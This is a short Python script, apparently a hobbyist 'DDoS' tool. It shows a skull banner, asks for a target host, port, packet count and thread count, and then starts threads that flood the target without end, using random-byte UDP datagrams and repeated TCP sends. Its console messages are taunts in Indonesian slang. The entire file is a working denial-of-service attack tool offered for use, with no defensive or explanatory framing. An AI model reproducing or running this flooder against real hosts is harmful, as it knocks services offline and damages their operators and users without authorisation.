	#!/usr/bin/env python3
#Code by pushy
#Remake by : pushy
import random
import socket
import threading
import os,sys
import time

os.system("clear")
print("""\033[91m
               ...
             ;::::;
           ;::::; :;.      
         ;:::::'   :;.    Remake By : Pushy
        ;:::::;     ;.          
       ,:::::'       ;           OOO\
       ::::::;       ;          OOOOO\
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO
;`::::::`'::::::;;;::::: ,#/  /          DOOO
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O
  `:::::`::::::::;' /  / `:#
   ::::::`:::::;'  /  /   `#
""")
print("\033[0m")

ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" Gas Ddos?(y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urandom(1024)
	i = random.choice(("[PERMISI!!!","[PERMISI!!]","[PERMISI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET FROM pushy !!!")
		except:
			print("[MAMPUS] DOWN YAH BWANG!!!")

def run2():
	data = random._urandom(24)
	i = random.choice(("[PERMISI!!]","[PERMISI!!]","[PPERMISI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET FROM pushy!!!")
		except:
			s.close()
			print("[MAMPUS] DOWN YAH BWANG!!!")

def run3():
	data = random._urandom(16)
	i = random.choice(("[PERMISI!!]","[PERMISI!!]","[PERMISI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET FROM pushy!!!")
		except:
			s.close()
			print("[MAMPUS] DOWN YAH BWANG!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
